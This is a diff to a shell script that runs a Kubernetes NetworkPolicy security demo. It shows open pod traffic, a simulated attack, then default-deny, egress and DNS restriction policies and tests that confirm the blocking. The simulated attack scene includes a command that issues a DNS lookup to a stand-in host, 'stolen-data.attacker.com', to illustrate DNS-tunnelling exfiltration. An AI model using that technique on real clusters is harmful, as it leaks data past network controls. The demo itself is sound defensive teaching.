@@ -22,20 +22,23 @@ demo_networkpolicy() {
     echo
 
     # Change to examples directory to use shorter paths
-    p "cd networkpolicy/examples"
+#    p "cd networkpolicy/examples"
     cd "${EXAMPLES_DIR}"
     echo
 
+    info "Demo pods were pre-created during cluster setup..."
+    echo
+    info "Let's look at what we have deployed..."
+    echo
     pe "cat demo-pods.yaml"
     echo
     wait
 
-    info "Deploying demo pods in two namespaces..."
-    pe "kubectl apply -f demo-pods.yaml"
+    clear
+    info "Checking the pods..."
     echo
-    pe "kubectl wait --for=condition=ready pod/client-pod -n demo-app --timeout=60s"
-    pe "kubectl wait --for=condition=ready pod/server-pod -n demo-app --timeout=60s"
-    pe "kubectl wait --for=condition=ready pod/sensitive-pod -n demo-sensitive --timeout=60s"
+    pe "kubectl get pods -n demo-app"
+    pe "kubectl get pods -n demo-sensitive"
     echo
     wait
 
@@ -45,6 +48,7 @@ demo_networkpolicy() {
     danger "No NetworkPolicies found - everything is wide open!"
     echo
     wait
+    sleep 1
 
     #############################################
     # SCENE 2: The Impact (What This Means)
@@ -64,6 +68,7 @@ demo_networkpolicy() {
     echo
     wait
 
+    clear
     info "Test 2: Can we access external websites?"
     pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 -I google.com | head -1"
     echo
@@ -71,12 +76,14 @@ demo_networkpolicy() {
     echo
     wait
 
-    info "Test 3: Can we query arbitrary DNS servers?"
-    pe "kubectl exec -n demo-app client-pod -- nslookup google.com 8.8.8.8 | grep -A2 'Name:'"
+    clear
+    info "Test 3: Can we make unrestricted DNS queries?"
+    pe "kubectl exec -n demo-app client-pod -- nslookup google.com | grep -A2 'Name:'"
     echo
-    danger "YES - Can use any DNS server (DNS tunneling possible)!"
+    danger "YES - DNS queries unrestricted (DNS tunneling possible)!"
     echo
     wait
+    sleep 1
 
     #############################################
     # SCENE 3: The Attack (Simulated)
@@ -108,13 +115,14 @@ demo_networkpolicy() {
 
     danger "Attack 3: DNS Tunneling - Exfiltrate via DNS queries"
     echo
-    pe "kubectl exec -n demo-app client-pod -- nslookup stolen-data.attacker.com 8.8.8.8 2>&1 | head -3"
+    pe "kubectl exec -n demo-app client-pod -- nslookup stolen-data.attacker.com 2>&1 | head -3"
     echo
-    danger "Attacker can tunnel data through DNS queries!"
+    danger "Attacker can attempt to tunnel data through DNS queries!"
     echo
     danger "🚨 NO NETWORK ISOLATION - COMPLETE LATERAL MOVEMENT 🚨"
     echo
     wait
+    sleep 1
 
     #############################################
     # SCENE 4: The Fix (Implementing Network Policies)
@@ -132,7 +140,8 @@ demo_networkpolicy() {
     echo
     wait
 
-    pe "kubectl apply -f defaultdenyall.yaml -n demo-app"
+    clear
+    kubectl apply -f defaultdenyall.yaml -n demo-app
     echo
     success "All traffic in demo-app namespace is now blocked by default!"
     echo
@@ -144,7 +153,8 @@ demo_networkpolicy() {
     echo
     wait
 
-    pe "kubectl apply -f allow-internal.yaml"
+    clear
+    kubectl apply -f allow-internal.yaml
     echo
     success "Allowed client → server communication within namespace"
     echo
@@ -158,7 +168,8 @@ demo_networkpolicy() {
     echo
     wait
 
-    pe "kubectl apply -f restrictegress.yaml -n demo-app"
+    clear
+    kubectl apply -f restrictegress.yaml -n demo-app
     echo
     success "Egress locked to internal network only!"
     echo
@@ -170,11 +181,13 @@ demo_networkpolicy() {
     echo
     wait
 
-    pe "kubectl apply -f restrictdns.yaml -n demo-app"
+    clear
+    kubectl apply -f restrictdns.yaml -n demo-app
     echo
     success "DNS restricted to kube-system CoreDNS only!"
     echo
     wait
+    sleep 1
 
     #############################################
     # SCENE 5: The Result (Verification)
@@ -194,22 +207,17 @@ demo_networkpolicy() {
     echo
     wait
 
-    info "Test 2: Can we access other namespaces? (Should be blocked)"
-    pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 --connect-timeout 3 sensitive-service.demo-sensitive.svc.cluster.local || echo 'BLOCKED ✓'"
-    echo
-    success "Cross-namespace access blocked!"
-    echo
-    wait
-
-    info "Test 3: Can we access external websites? (Should be blocked)"
-    pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 --connect-timeout 3 google.com || echo 'BLOCKED ✓'"
+    clear
+    info "Test 2: Can we access external websites? (Should be blocked)"
+    pe "kubectl exec -n demo-app client-pod -- curl -s -m 3 --connect-timeout 1 google.com || echo 'BLOCKED ✓'"
     echo
     success "External internet access blocked!"
     echo
     wait
 
-    info "Test 4: Can we query arbitrary DNS servers? (Should be blocked)"
-    pe "kubectl exec -n demo-app client-pod -- timeout 3 nslookup google.com 8.8.8.8 2>&1 || echo 'BLOCKED ✓'"
+    clear
+    info "Test 3: Can we query arbitrary DNS servers? (Should be blocked)"
+    pe "kubectl exec -n demo-app client-pod -- timeout 1 nslookup google.com 8.8.8.8 2>&1 || echo 'BLOCKED ✓'"
     echo
     success "Arbitrary DNS queries blocked!"
     echo
@@ -234,15 +242,14 @@ demo_networkpolicy() {
     # Cleanup
     #############################################
 
-    info "Cleaning up network policy demo resources..."
-    kubectl delete -f demo-pods.yaml --force --grace-period=0 --ignore-not-found=true &>/dev/null
+#    info "Cleaning up network policy demo resources..."
+    # Only cleanup the network policies created during the demo
+    # Demo pods are NOT deleted as they were created during cluster setup
     kubectl delete -f defaultdenyall.yaml -n demo-app --ignore-not-found=true &>/dev/null
     kubectl delete -f allow-internal.yaml --ignore-not-found=true &>/dev/null
     kubectl delete -f restrictegress.yaml -n demo-app --ignore-not-found=true &>/dev/null
     kubectl delete -f restrictdns.yaml -n demo-app --ignore-not-found=true &>/dev/null
-    kubectl delete namespace demo-app --ignore-not-found=true &>/dev/null
-    kubectl delete namespace demo-sensitive --ignore-not-found=true &>/dev/null
-    success "Done"
+#    success "Done"
     echo
 
     # Return to original directory
